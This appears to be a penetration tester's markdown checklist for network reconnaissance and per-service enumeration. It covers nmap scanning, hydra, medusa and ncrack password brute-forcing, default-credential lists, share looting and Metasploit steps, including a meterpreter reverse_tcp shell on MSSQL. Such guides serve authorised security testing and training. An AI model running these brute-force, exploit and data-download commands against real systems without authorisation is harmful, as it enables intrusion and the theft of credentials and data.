# Reconnaissance Enumeration Methodology🛰
## Pre engagement
- [ ] Log all commands of the current session
	```bash
	script engagement_x.log
	--snip--
	exit # when the session has finished
	```
- [ ] Set the target IP to the $IP  variable
	```bash
	export $IP=x.x.x.x
	```

## General methodology
- [ ] add host to your /etc/hosts if you already know its name or if you found it
- [ ] For every open port TCP/UDP
	- [ ] Find service and version
	- [ ] Find known service bugs
	- [ ] Find configuration issues
	- [ ] Run nmap port scan / banner grabbing
- [ ] Google-Fu
	- [ ] Every error message
	- [ ] Every URL path
	- [ ] Every paramenter to find versions/apps/bugs
- [ ] searchsploit every serivce
- [ ] Google
	- [ ] Every version exploit db
	- [ ] Every version vulnerability
- [ ] If app has auth
	- [ ] User enumeration
	- [ ] Password bruteforce
	- [ ] Default credentials (Google them)
- [ ] revert the machine
- [ ] **DEFCON 1** try:
	```bash
	nmap --script exploit -Pn $IP
	```
- [ ] Check if the hostname/target's name is meaningful for the assessment (E.g.: google its name for product, technology, etc)
## Grab the damn banner!
- [ ] nc -v $IP \<PORT\>
- [ ] telnet $IP \<PORT\>
## Network & Port scanning
If you don't know the alive hosts,  you can scan the full subnet to find them, so you can do a deeper scan on them later.
### Go big
- [ ] List scan with nmap
	```bash
	nmap -sL -oN nmap/listScan 10.x.x.x/xx
	```
- [ ] Ping scan (run it with privileges)
	```bash
	nmap -sn -oN nmap/pingScan 10.x.x.x/xx
	```
- [ ] Look for hosts's info (name, logged-in user, MAC) with NetBIOS queries
	```bash
	nbtscan -r 10.x.x.x.x
	```
- [ ] Use ARP to do hosts discovery
	```bash
	netdiscover -r 10.x.x.x/24
	```
- [ ] smbtree
### Go small (Individual host scanning)
- [ ] Run a fast TCP port scan:
	```bash
	nmap -F -T4 -oN nmap/fastTCPScan $IP
	```
- [ ] Run a simple TCP port scan to uncover open ports
	```bash
	nmap -p- -T4 -oN nmap/ezTCPScan $IP
	```
- [ ] Run a simple UDP port scan to uncover open ports
	```bash
	nmap -sU -n -p- -T4 -oN nmap/ezUDPScan $IP
	```
- [ ] If lazy do an Aggressive scan on open ports (A = O+sC+sV)
	```bash
	nmap -A -T4 -px,y,z -v -oN nmap/aggressiveScan $IP
	```
- [ ] Do a version detection on TCP ports
	```bash
	nmap -sV --reason -O -p- $IP
	```
- [ ] Do a version detection on UDP ports
	```bash
	nmap -sU -sV -n $IP
	```
- [ ] Vulnerable to heartbleed?
	```bash
	nmap --script ssl-heartbleed $IP
	```
- [ ] Version/OS detection using other DNS servers
	```bash
	nmap -v --dns-server \<DNS\> -sV --reason -O --open -Pn $IP
	```
- [ ] Try identify unknown services
	```bash
	amap -d $IP \<PORT\>
	```
- [ ] Full vulnerability scanning with [vulnscan.nse]
	```bash
	nmap -sS -sV --script=/path/to/your/vulnscan.nse -oN nmap/vulnScan $IP
	```
## Service enumeration
### FTP (TCP 21) | TFTP (UDP 21)
- [ ]  [Banner grabbing](Methodologies/recon_enum_methodology🛰.md#grab-the-damn-banner)
- [ ] Connect and check for anonymous access
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```
	- [ ] Check with nmap
		```bash
		nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -Pn -oN nmap/ftpVuln -p 21 $IP
		```
- [ ] Default credentials check
	```bash
	hydra -s <PORT> -C usr/share/wordlists/ftp-default-userpass.txt -u -f $IP ftp
	```
- [ ] Download recursively all the files
	```bash
	wget -r ftp://user:pass@$IP/
	wget -r --user="user" --password="secret" ftp://$IP/
	```
### SSH (TCP 22)
- [ ]  [Banner grabbing](Methodologies/recon_enum_methodology🛰.md#grab-the-damn-banner)
- [ ] User enumeration
	```bash
	# using msf
	msf > use auxiliary/scanner/ssh/ssh_enumusers
	# leveraging exploit from ExploitDB
	python /usr/share/exploitdb/platforms/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $IP
	 ```
- [ ] Bruteforce root
	```bash
	hydra -v -V -l root -P password-file.txt ssh://$IP
	```
- [ ] Bruteforce list of user
	```bash
	hydra -v -V -L userlist.txt -P password-file.txt ssh://$IP
	```
- [ ] Use requested Key Exchange List
	```bash
	ssh user@$IP -oKexAlgorithms={kex\_list}
	```
- [ ] Use requested cipher
	```bash
	ssh user@$IP -c {cipher}
	```
- [ ] Use requested MAC
	```bash
	ssh user@$IP -m {MAC}
	```
### SMTP (TCP 25)
- [ ] Enumeration with nmap
	```bash
	nmap --script smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay -Pn -oN nmap/smtpEnum -p 25,465,587 $IP
	```
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```
	- [ ] Check with nmap
		```bash
		nmap --script smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -Pn -p 25,465,587 -oN nmap/smtpVuln $IP
		```
- [ ] nc -nvv $IP
- [ ] manual testing with **telnet** and VRFY / EXPN
### Finger (TCP 79)
- [ ] Download script and run it with a wordlist: [http://pentestmonkey.net/tools/user-enumeration/finger-user-enum]
	```bash
	finger-user-enum.pl -U users.txt -t $IP
	```
### Web App (TCP 80/443)
#### Phase Alpha - enumeration
- [ ] Investigate SSL/TLS cert details for further information
- [ ] Investigate **robots.txt**
- [ ] Investigate **crossdomain.xml**
- [ ] Investigate **clientaccesspolicy.xml**
- [ ] Identify all parameters. Document which parameters are used for **GET** and **POST**
- [ ] View source code
- [ ] Nikto
- [ ] Directory Traversal Fuzzer
	- [ ] Gobuster (**Doesn't work recursively!!!**)
		- [ ] File and directory fuzzing
		- [ ] Vhost bruteforcing
		- [ ] use -x to look for specific extensions (.txt, .php, .bak, .cfg, .json, .md, .git)
		- [ ] nothing? Ensure that you scan the correct protocol (HTTP/HTTPS) and directory
		- [ ] gobuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -t 50 -e -u $IP
		- [ ] gobuster -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s '200,204,403,500' -e -t 50 -u $IP/cgi-bin
		- [ ] Re-run for each directory found
	- [ ] wfuzz
	- [ ] dotdotpwn
- [ ] WhatWeb & weppalyzer to map the whole infrastructure:
	- [ ] Middleware
	- [ ] Programming languages
	- [ ] Backends
	- [ ] Services
	- [ ] Plugins
	- [ ] Which CMS is running?
		- [ ] wpscan
		- [ ] joomscan
		- [ ] drupwn
		- [ ] use nmap to enumerates installed Drupal themes/modules
			```bash
			nmap -p 80 --script http-drupal-enum $IP
			```
- [ ] WebDAV:
	- [ ] davtest
	- [ ] cadevar
	- [ ] Use nmap to detect WebDAV installations & listings:
		```bash
		nmap --script http-webdav-scan -p80,8080 $IP
		```
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```
- [ ] Check comments in source of all pages
	```bash
	nmap -p80 --script http-comments-displayer -oN nmap/commentHTTP $IP
	```
- [ ] RTFM! Read the manual for the application you are testing
	- [ ] Does it have a dev mode?
	- [ ] DEBUG=TRUE flag to see more?
	- [ ] Other interesting stuff?
- [ ] Look for where you can put data
	- [ ] API
	- [ ] Paywall or sign up
	- [ ] Unauthenticated
- [ ] Logical reasoning
	- [ ] Look at the application from a bad guy perspective, what does it do? what is the most valuable part? Some applications will value things more than others, for example a premium website might be more concerned about users being able to bypass the pay wall than they are of say cross-site scripting
	- [ ] Look at the application logic too, how is business conducted?
#### Phase Bravo - go deeper
- [ ] Follow webapp testing methodology [[webapp_testing_methodology🌐]]
- [ ] LFI / RFI test
- [ ] cgi-bin found? try shellshock [https://www.exploit-db.com/exploits/34900]
- [ ] Check every input field for SQLi
	- [ ] Cheatsheet 1 [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md]
	- [ ] Cheatsheet 2 [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md]
	- [ ] Cheatsheet 3 [https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/ ]
- [ ] Check for code injection: [Owasp code injection]

### DNS (UDP/TCP 53)
- [ ] Find domain names for host
	```bash
	whois $IP
	```
- [ ] Find IP and authoritative servers
	```bash
	nslookup domain.com
	```
- [ ] Resolve DNS
	```bash
	host website.com
	nslookup website.com
	```
- [ ] Find name servers
	```bash
	host -t ns domain.com
	```
- [ ] Find mail servers
	```bash
	host -t mx domain.com
	```
- [ ] Is DNS zone transfer possible?
	```bash
	nmap --script dns-zone-transfer -p 53 domain.com
	```
- [ ] Request zone transfer
	```bash
	host -l domain.name dns.server 
	
	dig axfr @dns-server domain.name

	dnsrecon -d domain.com -t axfr
	````
- [ ] dnsrecon -d $IP -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```
	
###  POP (TCP 110)
- [ ] Is username enumeration possible?
- [ ] Nmap enumeration (Default scripts runned with -sC flag):
	```bash
	nmap --script pop3-capabilities -Pn -oN nmap/popCapabilities -p 110,995 $IP
	nmap --script pop3-ntlm-info -Pn -oN nmap/popInfo -p 110,995 $IP
	```
- [ ] telnet $IP 110
	```bash
	USER user@IP
	PASS admin
	LIST - once logged in list messages
	RETR \<MSG NUMBER\> - retrieve message
	QUIT
	```
- [ ] Bruteforce with nmap
	```bash
	nmap -n -v -script pop3-brute -p 110 $IP 
	```
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```

### RPCBind (TCP/UDP 111)
- [ ] rpcinfo -p $IP
### RPC (TCP 135)
- [ ] rpcinfo -p $IP
### SMB (TCP 139/445)
- [ ] Enumeration
	```bash
	nmblookup -A $IP
	enum4linux -a $IP
	nmap --script="smb-enum*" --script-args=unsafe=1 -T5 $IP
	nmap --script smb-enum-shares.nse --script-args=unsafe=1 -p445 $IP
	nmap --script smb-enum-users.nse --script-args=unsafe=1 -p445 $IP
	nmap --script smb-protocols $IP
	```
- [ ] nbtscan
- [ ] enum4linux
- [ ] Manual browsing (Prefer it whenever possible):
	```bash
	smbclient -L INSERTIPADDRESS
	smbclient //INSERTIPADDRESS/tmp
	smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
	smbclient //INSERTIPADDRESS/ipc$ -U john
	smbclient //INSERTIPADDRESS/admin$ -U john
	winexe -U username //INSERTIPADDRESS "cmd.exe" --system
	```
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```
	- [ ] Check with nmap
		```bash
		nmap -n -v --script="smb-vuln*" -oN nmap/smbAllVulns  -p 139,445 $IP
		nmap -n -v --script smb-os-discovery.nse --script-args=unsafe=1 -oN nmap/smbOS -p 445 $IP
		nmap -n -v --script smb-check-vulns --script-args=unsafe=1 -oN nmap/smbCehckVulns -p445 $IP
		```
- [ ] Download recursively all the files
	```bash
	smbclient \\\\$IP\\share
	mask ""
	recurse ON
	prompt OFF
	mget *
	```
### SNMP (UDP 161)
- [ ] Enumeration
	```bash
	for community in public private manager; do snmpwalk -c $community -v1 $IP; done
	snmpwalk -c public -v1 $IP
	snmpenum -t $IP
	snmpcheck -t $IP -c public
	nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $ip
	```
- [ ] Bruteforce community names
	```bash
	onesixtyone -c names -i hosts # fast
	```
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```

### MSSQL (TCP 1433)
- [ ] Enumerate MSSQL Servers
	```bash
	# using msf
	msf > use auxiliary/scanner/mssql/mssql_ping
	
	nmap -sU --script=ms-sql-info $IP
	```
- [ ] Password bruteforcing
	```bash
	# using msf
	msf > use auxiliary/scanner/mssql/mssql_login
	
	hydra -l <USERNAME> -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt $IP -s <PORT> -t 5 mssql
	hydra -s <PORT> -C ./wordlists/mssql-default-userpass.txt -u -f $IP mssql
	medusa -h $IP -M mssql -u sa -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -e ns -F -t 5
	```
- [ ] Gain shell using gathered credentials
	```bash
	# using msf
	msf > use exploit/windows/mssql/mssql_payload
	msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
	```
- [ ] Log in to a MSSQL Server
	```bash
	sqsh -S $IP -U sa -P password -D db_name
	```
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```
	- [ ] Check with nmap
		```bash
		nmap -vv -sV -Pn -p \<PORT\> --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=%s,smsql.username-sa,mssql.password-sa $IP
		```
### Oracle (TCP 1521)
-  [ ] Default credentials
	```bash
	hydra -s <PORT> -C ./wordlists/oracle-default-userpass.txt -u -f $IP
	```
- [ ] tnscmd10g version -h $IP
- [ ] tnscmd10g status -h $IP
- [ ] **oracle-version** \- MSF module which scans Oracle DB to find the version
	```bash
	# using msf
	msfcli auxiliary/scanner/oracle/tnslsnr\_version rhosts=$IP E
	```
- [ ] **oracle-sid** \- MSF module to enumerate the Oracle DB SID
	```bash
	# using msf
	msfcli auxiliary/scanner/oracle/sid\_enum rhosts=$IP E
	```
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```
### MySQL (TCP 3306)
- [ ] Default credentials?
	```bash
	hydra -s <PORT> -C usr/share/wordlists/mysql-default-userpass.txt -u -f $IP mysql
	```bash
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```
	- [ ] Check with nmap
		```bash
		nmap -sV -Pn -vv --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 -p 3306 $IP
		```
### PostgreSQL (TCP 5432)
- [ ] Try default credentials:
	```bash
	postgres : postgres
	postgres : password  
	postgres : admin
	admin : admin
	admin : password
	```
- [ ] [Pentest wiki](https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md) will save you time
- [ ] [HackTricks PSQL ](https://book.hacktricks.xyz/pentesting/pentesting-postgresql)
- [ ] [Hacking Articles PSQL](https://www.hackingarticles.in/penetration-testing-on-postgresql-5432/)
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```
### Redis (TCP 6379)
- [ ] https://redis.io/documentation
- [ ] Interesting [article](http://antirez.com/news/96) by Antirez on Redis security
- [ ] HackTricks' [guide](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
- [ ] ProgrammerSought's [guide](https://www.programmersought.com/article/8758132629/)
- [ ] Google-Fu
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
		```bash
		site:github.com *Service version.release*
		```
### RDP (TCP/UDP 3389)
- [ ] Use rpd-sec-check to enumerate security settings:
	```bash
	perl ./scripts/rdp-sec-check.pl $IP:<PORT>
	```
- [ ] Use ncrack to brute force RDP:
	```bash
	ncrack -vv --user administrator -P /user/share/wordlists/rockyou.txt rdp://$IP
	```
- [ ] Use hydra to bruteforce RDP:
	```bash
	hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
	```
- [ ] Check for BlueKeep
- [ ] Check login with default guest account and blank password
- [ ] Check with gathered users:passwds

### VNC (TCP 5900)
- [ ] Enum with nmap
	```bash
	nmap -sV -Pn -vv --script\=vnc-info,vnc-title -oN nmap/vncEnum -p 5900 $ip
	```
- [ ] Check for easy VNC passwords
- [ ] Bruteforce:
	```bash
	hydra -s 5900 -P /usr/share/seclists/Passwords/darkweb2017-top10.txt vnc://$IP
	```
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	```bash
	site:github.com *Service version.release*
	```
	- [ ] Check with nmap
	```bash
	nmap -sV -Pn -vv --script realvnc-auth-bypass -oN nmap/vncAuthBypass -p 5900 $IP
	```

### LDAP (TCP/UDP 389) | LDAPS (TCP/UDP 636)
- [ ]  LDAPSearch can be utilized to locate and retrieve directory entries
	```bash
	ldapsearch -h $IP -p <PORT> -x -s base
	```

### Kerberos (88/464)
- [ ] Passive network sniffing
	```bash
	kerbcrack
	```
- [ ] User enumeration
	```bash
	nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=research $IP
	```
- [ ] Test MS14-068
### Rsync (TCP 873)
- [ ] Manual enumeration
	```bash
	nc -vn 127.0.0.1 873
	(UNKNOWN) [127.0.0.1] 873 (rsync) open
	@RSYNCD: 31.0        <--- You receive this banner with the version from the server
	@RSYNCD: 31.0        <--- Then you send the same info
	#list                <--- Then you ask the sever to list
	raidroot             <--- The server starts enumerating
	USBCopy        	
	NAS_Public     	
	_NAS_Recycle_TOSRAID	<--- Enumeration finished
	@RSYNCD: EXIT         <--- Sever closes the connection

	#Now lets try to enumerate "raidroot"
	nc -vn 127.0.0.1 873
	(UNKNOWN) [127.0.0.1] 873 (rsync) open
	@RSYNCD: 31.0
	@RSYNCD: 31.0
	raidroot
	@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
	```
- [ ] Automate the enum
	```bash
	# using nmap
	nmap -sV --script "rsync-list-modules" -p <PORT> <IP>

	# using msf
	msf> use auxiliary/scanner/rsync/modules_list

	# using rsync application

	rsync -av --list-only rsync://$IP:$PORT
	```
- [ ] Gather the modules
	```bash
	# if no auth is required, you can list the module with
	rsync -av --list-only rsync://$IP/module_name
	# you can download with
	rsync -av rsync://$IP/module_name ./downloaded_module
	# you can upload with
	rsync -av /path/to/upload/ rsync://$IP/destination/path/
	
	# if auth is required, you just need to add username@$IP
	# e.g.:
	# rsync -av --list-only rsync://username@$IP/module_name
	```
### Image File Investigation
- [ ] Always use wget for downloading files to keep original timestamps and file information
- [ ] Use binwalk and strings to check image files for hidden content
- [ ] steghide

### NFS Share
- [ ] Show NFS shares
	```bash
	showmount -e $IP <PORT>
	```

### Packet inspection
- [ ] Wireshark
- [ ] tcpdump
	```bash
	tcpdump tcp port <PORT> -w output.pcap -i <INTERFACE>
	tcpdump -i any host <IP-TO-FILTER>
	```
### Anything else
- [ ] nmap scripts (locate *nse* | grep servicename)
- [ ] hydra
- [ ]  MSF auxiliary modules
- [ ]  Download the software and investigate it locally
- [ ]  Try enumeration scripts for specific services


[vulnscan.nse]: https://github.com/scipag/vulscan
[http://pentestmonkey.net/tools/user-enumeration/finger-user-enum]: http://pentestmonkey.net/tools/user-enumeration/finger-user-enum
[https://www.exploit-db.com/exploits/34900]: https://www.exploit-db.com/exploits/34900
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md]: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
[https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/  
]: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
[Owasp code injection]: https://owasp.org/www-community/attacks/Code_Injection
